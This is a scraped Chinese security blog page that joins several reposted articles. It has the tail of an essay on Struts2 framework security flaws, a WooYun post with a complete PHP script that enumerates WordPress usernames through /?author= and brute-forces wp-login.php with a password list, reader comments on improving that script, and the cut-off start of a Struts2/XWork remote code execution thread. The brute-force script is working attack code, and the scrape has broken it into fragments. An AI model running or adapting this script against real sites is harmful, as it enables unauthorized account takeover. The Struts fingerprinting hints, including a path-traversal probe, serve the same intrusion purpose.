<p>本文其实没有提到一些web漏洞，比如csrf，比如session fix，比如传输加密等，很明显struts是存在漏洞 的，只是作者觉得这些东西没必要这里说，大家都是明眼人，看到form里没有token，百分百csrf嘛！ 想想官方，官方也明明知道上了自己的框架后，会存在这些漏洞，为什么连个提醒都没有呢？本来开发就 不知道，你又藏着掖着。如果框架负责任，发个公告，说如果你用了我的框架，实际上要小心什么什么攻击。。。 呃。。。我明白官方为什么不敢说了。-_-! 这些框架除了那些“只要你用，必然有漏洞”的安全缺陷外，还有不少问题，会出现在开发人员使用框架的 过程中： 1，两个框架都方便，结合起来有漏洞 有个框架叫做Spring security，是基于url的访问权限控制，做的很好。如果你不是管理员，绝对不能 访问admin目录。但是有很多web框架，访问一个action或者访问一个controller，不止一个url可以访问， 在这里做了兼容性处理，多个url指向同一个应用，导致Spring security这种基于url的访问控制，名存实亡。 2，开发人员“正常”使用框架后，可能产生漏洞 这是最最惨的事情，框架绝对不会认领这种类型的漏洞的，他会认为这是开发的问题。然而本文的 “action方法暴力破解、url redirect扩大化”这两个安全缺陷，实际上也是框架存在的意义（方便开发） 带来的后果。官方会修补么？我想它顶多会说，大家不要这样那样而已，绝对不会做什么安全方案的。 要知道这些漏洞是具有struts或者webwork特色的，只有使用了这些框架才会有的。 3，危险功能点 框架带来了一些功能点，比如Tag lib的一些XSS，只要使用，必定有漏洞。 4，框架给开发挖坑 这根本就是陷阱，还是要说/static、/struts，如果开发不配置，顶多下载个js，影响不大，万一开发使用 了这个功能，映射了某个目录，那就掉进坑里去了。 5，一个框架带来的漏洞被另一个框架最大化 本文提到了变量默认值被覆盖后，又因为hibernate不需要写sql语句，而最终被存储进了数据库中。 回想一个问题，如果让我们自己写sql语句实现，难道在添加普通用户的时候，会真的专门写个变量， 接收用户传进来注册管理员的字段么？ 但是这是hibernate得问题么？当然不是，只是因为有了它，导致漏洞更加严重而已。</p>
<h3 id="-">补充</h3>
<p>本文对struts2的种种安全缺陷，就提到这里。个人觉得这是一个挖漏洞的方向，对framework漏洞的挖掘。 可能大家都专注于代码安全，没有太多的去看框架本身是否安全，以及使用了框架后，是否真的安全。 所以很多人忽略这个问题，我相信这不是一个新的开始，也不是一个结束，只是让大家开始更加重视框架安全。 作者也仅仅在本文提到了struts，webwork这两个框架，事实上框架很多，他们真的安全么？有待考证！ 最后写给那些真正打算把技术应用于实践的同学们，框架漏洞扫描器，是可以做出来的，对于难以解决的猜解 问题，可以对网站蜘蛛一下，然后保存那些开发人员喜欢使用的字段名称，关注各个input的名字，action的 名字，目录名字等，生成猜解一个列表。而判断是否用了struts更加简单： 特征1：XXX.action 可能是struts或webwork 特征2：XXX.do 可能是struts或webwork 特征3：XXX!bbb.action 可能是struts或webwork 特征4：XXX/struts/..%252f 必然是struts2 其他细节处，不再一一给出，有待大家发掘。 相关的漏洞修补方式，作者不在此处献丑，请大家根据漏洞原理自行处理。</p>
<h3 id="-">感谢</h3>
<p>---------------------------------------- 感谢axis （<a href="http://hi.baidu.com/aullik5）对本文提出的建议。" target="_blank">http://hi.baidu.com/aullik5）对本文提出的建议。</a> 感谢幻影webzine <a href="http://webzine.ph4nt0m.org/" target="_blank">http://webzine.ph4nt0m.org/</a> 感谢struts所有开发人员种种有趣的代码。 作者DEMO中有敏感数据，恕不能提供，请大家自行搜索strutsdemo搭建环境测试。 Struts2：<a href="http://struts.apache.org/2.x/" target="_blank">http://struts.apache.org/2.x/</a> Struts2 svn：<a href="http://svn.apache.org/viewvc/struts/struts2/trunk/" target="_blank">http://svn.apache.org/viewvc/struts/struts2/trunk/</a>
Powered by: <a href="http://www.ph4nt0m.org/" target="_blank">Ph4nt0m Security</a> © 2009 <a href="http://www.ph4nt0m.org/" target="_blank">Ph4nt0m Security Team</a>.</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/Java/">Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/Java/" class="label label-primary">Java</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-Java--Struts2框架安全缺陷/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-Java--Struts2框架安全缺陷" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-PHP-WordPress--跑wordpress用户密码脚本/">跑wordpress用户密码脚本</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全-PHP-WordPress--跑wordpress用户密码脚本/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-wordpress-">跑wordpress用户密码脚本</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<h1 id="-wooyun-http-drops-wooyun-org-wooyun-"><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">WooYun知识库</a></h1>
<p><a href="http://drops.wooyun.org/login" title="登录" target="_blank">登录</a></p>
<p>像一朵乌云一样成长</p>
<ul>
<li><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">首页</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">WooYun</a></li>
<li><a href="http://zone.wooyun.org/" target="_blank">Zone</a></li>
<li><a href="http://drops.wooyun.org/newsend" target="_blank">投稿</a>
<a href="http://drops.wooyun.org/" title="首页" target="_blank">首页</a> » <a href="http://drops.wooyun.org/category/tools" title="查看 工具收集 中的全部文章" target="_blank">工具收集</a> » 跑wordpress用户密码脚本</li>
</ul>
<h2 id="-wordpress-http-drops-wooyun-org-tools-601-permanent-link-to-wordpress-"><a href="http://drops.wooyun.org/tools/601" title="Permanent Link to 跑wordpress用户密码脚本" target="_blank">跑wordpress用户密码脚本</a></h2>
<p>4人收藏 <a href="">收藏</a></p>
<p>2013/09/17 15:04  | <a href="http://drops.wooyun.org/author/瞌睡龙" title="由 瞌睡龙 发布" target="_blank">瞌睡龙</a>  | <a href="http://drops.wooyun.org/category/tools" title="查看 工具收集 中的全部文章" target="_blank">工具收集</a>  | <a href="">占个座先</a></p>
<p>在做渗透测试的时候，有时候会遇到一个wordpress博客，如果版本比较新，插件也没有漏洞的话，可以爆破用户名密码来尝试下。</p>
<p>大脑混沌情况下写的，有bug欢迎提出，由于是php的所以跑起来比较慢，下次发包还是调用命令结合hydra来爆破。</p>
<p>原理是通过URL</p>
<p>/?author=
遍历获取用户名，然后先跑用户名与密码相同的用户，再调用同目录下pass.txt中的密码文件进行爆破。</p>
<p>默认获取前10个用户，可自行修改。</p>
<p>使用方法：
php wordpress.php <a href="http://www.test.com" target="_blank">http://www.test.com</a></p>
<p>1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
11</p>
<p>12
13</p>
<p>14
15</p>
<p>16
17</p>
<p>18
19</p>
<p>20
21</p>
<p>22
23</p>
<p>24
25</p>
<p>26
27</p>
<p>28
29</p>
<p>30
31</p>
<p>32
33</p>
<p>34
35</p>
<p>36
37</p>
<p>38
39</p>
<p>40
41</p>
<p>42
43</p>
<p>44
45</p>
<p>46
47</p>
<p>48
49</p>
<p>50
51</p>
<p>52
53</p>
<p>54
55</p>
<p>56
57</p>
<p>58
59</p>
<p>60
61</p>
<p>62
63</p>
<p>64
65</p>
<p>66
67</p>
<p>68
69</p>
<p>70
71</p>
<p>72
73</p>
<p>74
75</p>
<p>76
77</p>
<p>78
79</p>
<p>80
81</p>
<p>82
83</p>
<p>84
&lt;?php</p>
<p>set_time_limit(0);</p>
<p>$domain</p>
<p>=</p>
<p>$argv</p>
<p>[1];</p>
<p>//获取用户名
for</p>
<p>(</p>
<p>$i</p>
<p>=1;</p>
<p>$i</p>
<p>&lt;= 10;</p>
<p>$i</p>
<p>++) {</p>
<p>$url</p>
<p>=</p>
<p>$domain</p>
<p>.</p>
<p>&quot;/?author=&quot;</p>
<p>.</p>
<p>$i</p>
<p>;</p>
<p>$response</p>
<p>= httprequest(</p>
<p>$url</p>
<p>,0);</p>
<p>if</p>
<p>(</p>
<p>$response</p>
<p>== 404) {</p>
<p>continue</p>
<p>;</p>
<p>}</p>
<p>$pattern</p>
<p>=</p>
<p>&quot;{<title>(./*) |}&quot;</p>
<p>;</p>
<p>preg_match(</p>
<p>$pattern</p>
<p>,</p>
<p>$response</p>
<p>,</p>
<p>$name</p>
<p>);</p>
<p>$namearray</p>
<p>[] =</p>
<p>$name</p>
<p>[1];
}</p>
<p>echo</p>
<p>&quot;共获取用户&quot;</p>
<p>.</p>
<p>count</p>
<p>(</p>
<p>$namearray</p>
<p>).</p>
<p>&quot;名用户\n&quot;</p>
<p>;</p>
<p>echo</p>
<p>&quot;正在破解用户名与密码相同的用户：\n&quot;</p>
<p>;</p>
<p>$crackname</p>
<p>= crackpassword(</p>
<p>$namearray</p>
<p>,</p>
<p>&quot;same&quot;</p>
<p>);</p>
<p>$passwords</p>
<p>= file(</p>
<p>&quot;pass.txt&quot;</p>
<p>);</p>
<p>echo</p>
<p>&quot;正在破解弱口令用户：\n&quot;</p>
<p>;</p>
<p>if</p>
<p>(</p>
<p>$crackname</p>
<p>) {</p>
<p>$namearray</p>
<p>=</p>
<p>array_diff</p>
<p>(</p>
<p>$namearray</p>
<p>,</p>
<p>$crackname</p>
<p>);
}</p>
<p>crackpassword(</p>
<p>$namearray</p>
<p>,</p>
<p>$passwords</p>
<p>);</p>
<p>function</p>
<p>crackpassword(</p>
<p>$namearray</p>
<p>,</p>
<p>$passwords</p>
<p>){</p>
<p>global</p>
<p>$domain</p>
<p>;</p>
<p>$crackname</p>
<p>=</p>
<p>&quot;&quot;</p>
<p>;</p>
<p>foreach</p>
<p>(</p>
<p>$namearray</p>
<p>as</p>
<p>$name</p>
<p>) {</p>
<p>$url</p>
<p>=</p>
<p>$domain</p>
<p>.</p>
<p>&quot;/wp-login.php&quot;</p>
<p>;</p>
<p>if</p>
<p>(</p>
<p>$passwords</p>
<p>==</p>
<p>&quot;same&quot;</p>
<p>) {</p>
<p>$post</p>
<p>=</p>
<p>&quot;log=&quot;</p>
<p>.urlencode(</p>
<p>$name</p>
<p>).</p>
<p>&quot;&amp;pwd=&quot;</p>
<p>.urlencode(</p>
<p>$name</p>
<p>).</p>
<p>&quot;&amp;wp-submit=%E7%99%BB%E5%BD%95&amp;redirect_to=&quot;</p>
<p>.urlencode(</p>
<p>$domain</p>
<p>).</p>
<p>&quot;%2Fwp-admin%2F&amp;testcookie=1&quot;</p>
<p>;</p>
<p>$pos</p>
<p>=</p>
<p>strpos</p>
<p>(httprequest(</p>
<p>$url</p>
<p>,</p>
<p>$post</p>
<p>),</p>
<p>&#39;div id=&quot;login_error&quot;&#39;</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>$pos</p>
<p>=== false) {</p>
<p>echo</p>
<p>&quot;$name $name&quot;</p>
<p>.</p>
<p>&quot;\n&quot;</p>
<p>;</p>
<p>$crackname</p>
<p>[] =</p>
<p>$name</p>
<p>;</p>
<p>}</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>foreach</p>
<p>(</p>
<p>$passwords</p>
<p>as</p>
<p>$pass</p>
<p>) {</p>
<p>$post</p>
<p>=</p>
<p>&quot;log=&quot;</p>
<p>.urlencode(</p>
<p>$name</p>
<p>).</p>
<p>&quot;&amp;pwd=&quot;</p>
<p>.urlencode(</p>
<p>$pass</p>
<p>).</p>
<p>&quot;&amp;wp-submit=%E7%99%BB%E5%BD%95&amp;redirect_to=&quot;</p>
<p>.urlencode(</p>
<p>$domain</p>
<p>).</p>
<p>&quot;%2Fwp-admin%2F&amp;testcookie=1&quot;</p>
<p>;</p>
<p>$pos</p>
<p>=</p>
<p>strpos</p>
<p>(httprequest(</p>
<p>$url</p>
<p>,</p>
<p>$post</p>
<p>),</p>
<p>&#39;div id=&quot;login_error&quot;&#39;</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>$pos</p>
<p>=== false) {</p>
<p>echo</p>
<p>&quot;$name $pass&quot;</p>
<p>.</p>
<p>&quot;\n&quot;</p>
<p>;</p>
<p>}</p>
<p>}</p>
<p>}</p>
<p>}</p>
<p>return</p>
<p>$crackname</p>
<p>;</p>
<p>}</p>
<p>function</p>
<p>httprequest(</p>
<p>$url</p>
<p>,</p>
<p>$post</p>
<p>){</p>
<p>$ch</p>
<p>= curl_init();</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_URL,</p>
<p>&quot;$url&quot;</p>
<p>);</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_RETURNTRANSFER, 1);</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_SSL_VERIFYPEER, false);</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_FOLLOWLOCATION,1);</p>
<p>if</p>
<p>(</p>
<p>$post</p>
<p>){</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_POST, 1);</p>
<p>//post提交方式</p>
<p>curl_setopt(</p>
<p>$ch</p>
<p>, CURLOPT_POSTFIELDS,</p>
<p>$post</p>
<p>);</p>
<p>}</p>
<p>$output</p>
<p>= curl_exec(</p>
<p>$ch</p>
<p>);</p>
<p>$httpcode</p>
<p>= curl_getinfo(</p>
<p>$ch</p>
<p>,CURLINFO_HTTP_CODE);</p>
<p>curl_close(</p>
<p>$ch</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>$httpcode</p>
<p>== 404) {</p>
<p>return</p>
<p>404;</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>return</p>
<p>$output</p>
<p>;</p>
<p>}
}</p>
<p>?&gt;
版权声明：未经授权禁止转载 <a href="http://drops.wooyun.org/author/瞌睡龙" title="由 瞌睡龙 发布" target="_blank">瞌睡龙</a>@<a href="http://drops.wooyun.org/" target="_blank">乌云知识库</a>
分享到： <a href="&quot;分享到QQ空间&quot;"></a> <a href="&quot;分享到新浪微博&quot;"></a> <a href="&quot;分享到腾讯微博&quot;"></a> <a href="&quot;分享到人人网&quot;"></a> <a href="&quot;分享到网易微博&quot;"></a> <a href="&quot;累计分享0次&quot;">0</a></p>
<h3 id="-">相关日志</h3>
<ul>
<li><a href="http://drops.wooyun.org/papers/660" target="_blank">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
<li><a href="http://drops.wooyun.org/tools/650" target="_blank">tunna工具使用实例</a></li>
<li><a href="http://drops.wooyun.org/tips/411" target="_blank">各种环境下的渗透测试</a></li>
<li><a href="http://drops.wooyun.org/tools/427" target="_blank">InsightScan:Python多线程Ping/端口扫描 + HTTP服务/APP 探测，可生成Hydra用的IP列表</a></li>
<li><a href="http://drops.wooyun.org/tools/655" target="_blank">GPU破解神器Hashcat使用简介</a></li>
<li><a href="http://drops.wooyun.org/tools/515" target="_blank">Zmap详细用户手册和DDOS的可行性</a>
上一篇:<a href="http://drops.wooyun.org/papers/598" target="_blank">OAuth 2.0安全案例回顾</a></li>
</ul>
<p>下一篇:<a href="http://drops.wooyun.org/papers/384" target="_blank">对某创新路由的安全测试</a></p>
<h3 id="-13-rss-2-0-http-drops-wooyun-org-tools-601-feed-trackback-http-drops-wooyun-org-tools-601-trackback-">楼被抢了 13 层了... <a href="">抢座</a>、<a href="http://drops.wooyun.org/tools/601/feed" target="_blank">Rss 2.0</a>或者 <a href="http://drops.wooyun.org/tools/601/trackback" target="_blank">Trackback</a></h3>
<ul>
<li><img src="" alt=""> erevus | 2013/09/17 15:53 | <a href="">/#</a></li>
</ul>
<p>好东西啊</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 瘦蛟舞 | 2013/09/17 16:09 | <a href="">/#</a></li>
</ul>
<p>龙哥的东西一直很实用~</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> ccSec | 2013/09/17 17:07 | <a href="">/#</a></li>
</ul>
<p>龙哥好流逼。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 园长 | 2013/09/17 17:44 | <a href="">/#</a></li>
</ul>
<p>wordpress太张狂了，连个验证码都不加。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> <a href="http://www.0x50sec.org/" target="_blank">c4rp3nt3r</a> | 2013/09/17 21:37 | <a href="">/#</a></li>
</ul>
<p>昨天我刚好也写了一个wordpress枚举用户名的小功能，楼主这个程序里面，枚举用户名的地方有问题。
一是 里的用户名是该用户显示的时候的名字，比如 登录用户名 admin，可以设置成 Administrator或者什么。虽然很多是一样的，这里确实不严谨。另一方面wordpress版本比较多，各种seo插件也比较多枚举用户名，只用里的信息貌似很不够，
还有 &lt;body class=&quot;archive author
以及 <a href="http://site/author/admin/" target="_blank"><a href="http://site/author/admin/">http://site/author/admin/</a></a>
这种等等。
交流而已，没别的意思。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> <a href="http://www.0x50sec.org/" target="_blank">c4rp3nt3r</a> | 2013/09/17 21:39 | <a href="">/#</a></li>
</ul>
<p>我觉得wpscan就不错，除非自己写个扫描器加入这个模块。嘿嘿。。。</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> 瞌睡龙 | 2013/09/18 11:24 | <a href="">/#</a></li>
</ul>
<p>哈，的确，忽略了登录用户名跟title的用户名可能不一样，虽然这个产生的情况很少。那你程序取用户名，是从哪里获取的呢？</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> <a href="http://www.0x50sec.org/" target="_blank">c4rp3nt3r</a> | 2013/09/18 11:44 | <a href="">/#</a></li>
</ul>
<p>我上面都说了哦</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> Ivan | 2013/09/18 03:25 | <a href="">/#</a></li>
</ul>
<p>收藏下~</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> xfkxfk | 2013/09/18 13:03 | <a href="">/#</a></li>
</ul>
<p>有时候/?author=number的确找不到，不过这个找到的概率到时挺高的，支持下</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> insight-labs | 2013/09/20 11:33 | <a href="">/#</a></li>
</ul>
<p>亲，我一直用hydra的http-post-form。还能多线程</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> luwikes | 2013/09/22 15:18 | <a href="">/#</a></li>
</ul>
<p>87</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<ul>
<li><img src="" alt=""> lhshaoren | 2013/09/23 22:28 | <a href="">/#</a></li>
</ul>
<p>还不错</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">登录以回复</a></p>
<h3 id="-">发表评论</h3>
<p><a href="">点击这里取消回复。</a></p>
<p>您必须 <a href="http://drops.wooyun.org/login" target="_blank">登陆</a> 后才能发表评论。</p>
<h3 id="-">订阅更新</h3>
<ul>
<li><a href="http://drops.wooyun.org/feed" title="点击订阅" target="_blank"><img src="" alt=""></a></li>
</ul>
<h3 id="-">分类</h3>
<ul>
<li><a href="http://drops.wooyun.org/category/papers" title="漏洞分析" target="_blank">漏洞分析</a> (40)</li>
<li><a href="http://drops.wooyun.org/category/tips" title="技术分享" target="_blank">技术分享</a> (57)</li>
<li><a href="http://drops.wooyun.org/category/tools" title="工具收集" target="_blank">工具收集</a> (5)</li>
<li><p><a href="http://drops.wooyun.org/category/news" title="业界资讯" target="_blank">业界资讯</a> (3)</p>
<h3 id="-">最新日志</h3>
</li>
<li><p><a href="http://drops.wooyun.org/tips/688" title="Flash CSRF" target="_blank">Flash CSRF</a></p>
</li>
<li><a href="http://drops.wooyun.org/tips/689" title="XSS与字符编码的那些事儿 —科普文" target="_blank">XSS与字符编码的那些事儿 —科普文</a></li>
<li><a href="http://drops.wooyun.org/papers/680" title="Zabbix SQL Injection/RCE – CVE-2013-5743" target="_blank">Zabbix SQL Injection/RCE – CVE-2013-5743</a></li>
<li><a href="http://drops.wooyun.org/papers/679" title="CDN流量放大攻击思路" target="_blank">CDN流量放大攻击思路</a></li>
<li><a href="http://drops.wooyun.org/news/674" title="从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集" target="_blank">从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集</a></li>
<li><a href="http://drops.wooyun.org/tips/662" title="攻击JavaWeb应用[8]-后门篇" target="_blank">攻击JavaWeb应用[8]-后门篇</a></li>
<li><a href="http://drops.wooyun.org/papers/660" title="php4fun.sinaapp.com PHP挑战通关攻略" target="_blank">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
<li><a href="http://drops.wooyun.org/papers/653" title="搭建基于Suricata+Barnyard2+Base的IDS前端Snorby" target="_blank">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li>
<li><a href="http://drops.wooyun.org/tools/655" title="GPU破解神器Hashcat使用简介" target="_blank">GPU破解神器Hashcat使用简介</a></li>
<li><a href="http://drops.wooyun.org/tips/649" title="内网渗透应用 跨vlan渗透的一种思路" target="_blank">内网渗透应用 跨vlan渗透的一种思路</a></li>
</ul>
<h3 id="-">最新评论</h3>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>c2y2 在 <a href="http://drops.wooyun.org/tips/689#comment-1883" target="_blank">XSS与字符编码的那些事儿 ---科普文</a>
谢谢</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>Evi1c0de 在 <a href="http://drops.wooyun.org/tips/573#comment-1877" target="_blank">如何用意念获取附近美女的手机号码</a>
连接CMCC跳转到登陆页面 右键源码 修改即可</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>牛牛 在 <a href="http://drops.wooyun.org/tips/688#comment-1871" target="_blank">Flash CSRF</a>
支持一下呵呵</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>luwikes 在 <a href="http://drops.wooyun.org/papers/178#comment-1870" target="_blank">JBoss安全问题总结</a>
mark</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>NgInx 在 <a href="http://drops.wooyun.org/tips/688#comment-1869" target="_blank">Flash CSRF</a>
好吧，基佬，顶你一个，不错。</p>
<ul>
<li><a href="">下一页 »</a>
Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> | GZai Theme by <a href="http://huaidan.org/" title="GZai Theme produced by 鬼仔" target="_blank">鬼仔</a>
<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img src="" alt=""></a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/PHP-WordPress/">PHP-WordPress</a></li></span></span> | <span class="tags">Tagged <a href="/tags/PHP-WordPress/" class="label label-primary">PHP-WordPress</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-PHP-WordPress--跑wordpress用户密码脚本/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-PHP-WordPress--跑wordpress用户密码脚本" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-Java--Struts2-XWork安全漏洞及解决办法/">Struts2</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全-Java--Struts2-XWork安全漏洞及解决办法/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="struts2-xwork-">Struts2-XWork 安全漏洞及解决办法</h1>
<p><a href="http://www.javaeye.com/login" title="登录" target="_blank">您还未登录 !</a> <a href="http://www.javaeye.com/all" target="_blank">我的应用</a> <a href="http://www.javaeye.com/login" target="_blank">登录</a> <a href="http://www.javaeye.com/signup" target="_blank">注册</a></p>
<p><a href="http://www.javaeye.com/" target="_blank"><img src="&quot;JavaEye-最棒的软件开发交流社区&quot;" alt="JavaEye-最棒的软件开发交流社区"></a></p>
<p><a href="http://www.javaeye.com/forums" target="_blank">论坛首页</a> → <a href="http://www.javaeye.com/forums/board/Java" target="_blank">Java编程和Java企业应用版</a> → <a href="http://www.javaeye.com/forums/tag/Struts" target="_blank">Struts</a> →</p>
<h1 id="struts2-xwork-">Struts2/XWork 安全漏洞及解决办法</h1>
<p><a href="http://www.javaeye.com/forums/board/Java" target="_blank">全部</a> <a href="http://www.javaeye.com/forums/tag/Hibernate" target="_blank">Hibernate</a> <a href="http://www.javaeye.com/forums/tag/Spring" target="_blank">Spring</a> <a href="http://www.javaeye.com/forums/tag/Struts" target="_blank">Struts</a> <a href="http://www.javaeye.com/forums/tag/iBATIS" target="_blank">iBATIS</a> <a href="http://www.javaeye.com/forums/tag/J2EE" target="_blank">企业应用</a> <a href="http://www.javaeye.com/forums/tag/Design-Pattern" target="_blank">设计模式</a> <a href="http://www.javaeye.com/forums/tag/DAO" target="_blank">DAO</a> <a href="http://www.javaeye.com/forums/tag/Object-Domain" target="_blank">领域模型</a> <a href="http://www.javaeye.com/forums/tag/OO" target="_blank">OO</a> <a href="http://www.javaeye.com/forums/tag/Tomcat" target="_blank">Tomcat</a> <a href="http://www.javaeye.com/forums/tag/SOA" target="_blank">SOA</a> <a href="http://www.javaeye.com/forums/tag/JBoss" target="_blank">JBoss</a> <a href="http://www.javaeye.com/forums/tag/Swing" target="_blank">Swing</a> <a href="http://www.javaeye.com/forums/tag/Java" target="_blank">Java综合</a>
<a href="http://www.javaeye.com/forums/39/topics/720209/posts/new" title="发表回复"></a></p>
<p><a href="http://www.javaeye.com/clicks/324" target="_blank">myApps快速开发平台，配置即开发、所见即所得，节约85%工作量</a></p>
<p>« 上一页 1 <a href="http://www.javaeye.com/topic/720209?page=2" target="_blank">2</a> <a href="http://www.javaeye.com/topic/720209?page=3" target="_blank">3</a> … <a href="http://www.javaeye.com/topic/720209?page=6" target="_blank">6</a> <a href="http://www.javaeye.com/topic/720209?page=7" target="_blank">7</a> <a href="http://www.javaeye.com/topic/720209?page=2" target="_blank">下一页 »</a>
浏览 7631 次
 <a href="http://www.javaeye.com/topic/720209" target="_blank">主题：Struts2/XWork 安全漏洞及解决办法</a></p>
<p><strong>该帖已经被评为精华帖</strong> 作者 正文 * my_corner</p>
<ul>
<li>等级: <img src="&quot;一星会员&quot;" alt="一星会员"></li>
<li><a href="http://my-corner.javaeye.com/" target="_blank"><img src="&quot;my_corner的博客: 我的角落&quot;" alt="my_corner的博客"></a></li>
<li>文章: 96</li>
<li>积分: 130</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2010-07-24   最后修改：2010-07-27</li>
</ul>
<p><a href="http://www.javaeye.com/topic/720209#" target="_blank">&lt;</a> <a href="http://www.javaeye.com/topic/720209#" target="_blank">&gt;</a> 猎头职位:</p>
<p>相关文章: <a href="http://www.javaeye.com/topic/720209#" title="关闭" target="_blank"> </a></p>
<ul>
<li><a href="http://www.javaeye.com/topic/713659" title="Struts2/XWork &lt; 2.2.0 Remote Command Execution Vulnerability 临时解决方法" target="_blank">Struts2/XWork &lt; 2.2.0 Remote Command Execution Vulnerability 临时解决方法</a></li>
<li><a href="http://www.javaeye.com/topic/24780" title="教你如何在java程序中调用本地应用程序" target="_blank">教你如何在java程序中调用本地应用程序</a></li>
<li><p><a href="http://www.javaeye.com/topic/413816" title="struts2 中同一个action的实现中对应多个input的处理方法" target="_blank">struts2 中同一个action的实现中对应多个input的处理方法</a>
推荐圈子: <a href="http://struts2.group.javaeye.com/" target="_blank">struts2</a>
<a href="http://www.javaeye.com/wiki/topic/720209" target="_blank">更多相关推荐</a>
exploit-db网站在7月14日爆出了一个Struts2的远程执行任意代码的漏洞。
漏洞名称：Struts2/XWork &lt; 2.2.0 Remote Command Execution Vulnerability
相关介绍：</p>
</li>
